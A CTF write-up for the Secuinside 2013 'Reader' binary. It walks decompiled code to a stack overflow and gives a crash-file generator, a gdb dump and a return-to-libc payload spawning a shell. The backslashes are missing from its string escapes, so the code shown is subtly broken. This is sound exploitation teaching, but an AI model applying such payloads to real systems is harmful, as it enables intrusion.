---
title: '[Secuinside CTF 2013] Reader Writeup'
author: suto
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358960
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
tags:
  - CLGT
  - CTF
  - return-to-libc
---
*Description:*

> http://war.secuinside.com/files/reader
> 
> ip : 59.9.131.155  
> port : 8282 (SSH)  
> account : guest / guest
> 
> We have obtained a program designed for giving orders to criminals.
> 
> Our investigators haven&#8217;t yet analyzed the file format this program reads.
> 
> Please help us analyze the file format this program uses, find a vulnerability, and take a shell.

From the description we can know this challenge requires an input file with correct format. Since it is simple to determine that format, I won&#8217;t talk deeper, you can find the details in sub_0804891A.  
So I will show the vulnerability in this &#8220;Reader&#8221;.

Below is the main routine of this challenge:

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl sub_80490B8(signed int a1, int a2)
{
  int v2; // ecx@7
  int result; // eax@7
  int file; // [sp+20h] [bp-90h]@4
  char buffer[140]; // [sp+24h] [bp-8Ch]@1

  *(_DWORD *)&buffer[136] = *MK_FP(__GS__, 20);
  if ( a1 &lt;= 1 )
  {
    printf("Usage: %s &lt;FILENAME&gt;n", *(_DWORD *)a2);
    exit(1);
  }
  sub_8048825(*(const char **)(a2 + 4));
  file = open(*(const char **)(a2 + 4), 0);
  if ( file &lt; 0 )
  {
    perror(&byte_8049322);
    exit(1);
  }
  pre_path(file, (_DWORD *)buffer);
  vuln_path((_DWORD *)buffer);
  free_path((_DWORD *)buffer);
  close(file);
  result = 0;
  if ( *MK_FP(__GS__, 20) != *(_DWORD *)&buffer[136] )
    __stack_chk_fail(v2, *MK_FP(__GS__, 20) ^ *(_DWORD *)&buffer[136]);
  return result;
}
</pre>

As you can see, variable buffer is used in multiple locations. After some minutes review I saw an interesting point in sub_08048C7A:

<pre class="brush: cpp; title: ; notranslate" title="">int __cdecl vuln_path_(_DWORD *BUFF)
{
  size_t ulen; // eax@4
  int v2; // edx@4
  int v3; // ecx@4
  int result; // eax@4
  unsigned int i; // [sp+28h] [bp-20h]@1
  int v6; // [sp+3Ch] [bp-Ch]@1

  v6 = *MK_FP(__GS__, 20);
  for ( i = 0; BUFF[2] &gt; i; ++i )
  {
    putchar(*(_BYTE *)(BUFF[7] + i));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  ulen = strlen((const char *)BUFF + 83);       // re-cal length (1)
  strncpy(BUFF[6], gPTR, ulen);                 // overflow occurs
  puts("n");
  result = *MK_FP(__GS__, 20) ^ v6;
  if ( *MK_FP(__GS__, 20) != v6 )
    __stack_chk_fail(v3, v2);
  return result;
}
</pre>

The *strncpy()* function copies **ulen** bytes from **gPTR** to **BUFF[6]** without any limit check. So I back to main routine to see where **BUFF[6]** is initialized, and it is located in sub_08048D41:

<pre class="brush: cpp; title: ; notranslate" title="">unsigned int index; // [sp+18h] [bp-20h]@1
  int s[7]; // [sp+1Ch] [bp-1Ch]@1

  bzero(s, 0x14u);
  putchar(10);
  for ( index = 0; *BUFF &gt; index; ++index )
  {
    putchar(*(_BYTE *)(BUFF[5] + index));
    fflush(stdout);
    usleep(BUFF[3]);
  }
  printf("nn ");
  for ( index = 0; BUFF[1] + 4 &gt; index; ++index )
  {
    putchar(*((_BYTE *)BUFF + 16));
    fflush(stdout);
    usleep(BUFF[3]);
  }
 .....
 .....
  BUFF[6] = &index;
 .....
 .....
</pre>

So **BUFF[6]** is set to address of local variable of this function, we can clearly see this function is not protected by stack cookie. So it is just a simple buffer overflow issue. We can craft a valid file format and see where it gets the input to calculate **ulen** in (1). Back to sub_0804891A we can see:

<pre class="brush: cpp; title: ; notranslate" title="">*BUFF = *(_DWORD *)&buf;
  read(fd, &buf, 4u);
  BUFF[1] = *(_DWORD *)&buf;                    // read 4 bytes from file
  read(fd, &buf, 4u);
  BUFF[2] = *(_DWORD *)&buf;
  read(fd, &buf, 4u);
  BUFF[3] = *(_DWORD *)&buf;
  read(fd, &buf, 1u);
  *((_BYTE *)BUFF + 16) = buf;
  if ( *BUFF &lt;= 4u || *BUFF &gt; 0x32u || BUFF[1] &gt; 0x64u || BUFF[2] &gt; 0x320u || !*((_BYTE *)BUFF + 16) )// 0x4-0x32 0x64 0x32
    ((void (__cdecl *)(_DWORD))ERR)("Initialization error");
  Copy(&buf, (char *)BUFF + 32);
  BUFF[5] = malloc(*BUFF);
  if ( !BUFF[5] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[6] = malloc(BUFF[1]);                    // use 4 bytes read above to malloc -&gt; BUFF[6] will has this length
  gPTR = (void *)BUFF[6]; -&gt; Set gPTR to BUFF[6]
  if ( !BUFF[6] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  BUFF[7] = malloc(BUFF[2]);
  if ( !BUFF[7] )
    ((void (__cdecl *)(_DWORD))ERR)("malloc() function error");
  bzero((void *)BUFF[5], *BUFF);
  bzero((void *)BUFF[6], BUFF[1]);
  bzero((void *)BUFF[7], BUFF[2]);
  read(fd, (void *)BUFF[5], *BUFF);
  read(fd, (void *)BUFF[6], BUFF[1]);
  read(fd, (void *)BUFF[7], BUFF[2]);
</pre>

Since it checks **BUFF[1]** with 0&#215;64, I blindly set it to 0&#215;63 to maximize the len of **gPTR** string and got a nice crash, so no need to do further investigation. Below is python code to generate valid *&#8220;test.sec&#8221;* file and trigger the crash:

<pre class="brush: python; title: ; notranslate" title="">data = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
       + "x08x00x00x00"
       + "x63x00x00x00" # will become BUFF[1] and length of BUFF[6]
       + "x32x00x00x00"
       + "x00x00x00x00"
       + "X"*200
file = open("test.sec","w")
file.write(data)
file.close()
</pre>

Run reader with *test.sec* and we got a crash looks like:

<pre class="brush: plain; title: ; notranslate" title="">- THE END -
document identifier code: 14821847921482184792148218479214821847921482184792

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x2
EBX: 0xb7fcfff4 --&gt; 0x1a0d7c
ECX: 0xffffffff
EDX: 0xb7fd18b8 --&gt; 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x58585858 ('XXXX')
ESP: 0xbffff640 ("XXXXXXXXXX")
EIP: 0x58585858 ('XXXX')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x58585858
[------------------------------------stack-------------------------------------]
0000| 0xbffff640 ("XXXXXXXXXX")
0004| 0xbffff644 ("XXXXXX")
0008| 0xbffff648 --&gt; 0x5858 ('XX')
0012| 0xbffff64c --&gt; 0xb7fff918 --&gt; 0x0
0016| 0xbffff650 --&gt; 0x0
0020| 0xbffff654 --&gt; 0x0
0024| 0xbffff658 --&gt; 0x0
0028| 0xbffff65c --&gt; 0xbffff794 --&gt; 0xbffff8b6 ("/home/suto/reader")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x58585858 in ?? ()
</pre>

As this is a local exploit, *&#8220;ulimit -s unlimited&#8221;* trick will help to de-randomize libc and a simple system(&#8220;sh&#8221;) will work. Payload:

<pre class="brush: plain; title: ; notranslate" title="">system = 0x4006b280
sh = 0x8048366
payload = "xff" + "SECUINSIDE" + "x00" + "Ax00"+"A"*26 +"CCCC" + "B"*(100-4-28) +"xff"*4
         + "x08x00x00x00"
         + "x08x00x00x00"
         + "x32x00x00x00"
         + "x00x00x00x00"
         + "A"*37 # padding
         + struct.pack("&lt;L", system) + struct.pack("&lt;L", -1) + struct.pack("&lt;L", sh)
fd = open("test.sec","w")
fd.write(payload)
fd.close()
</pre>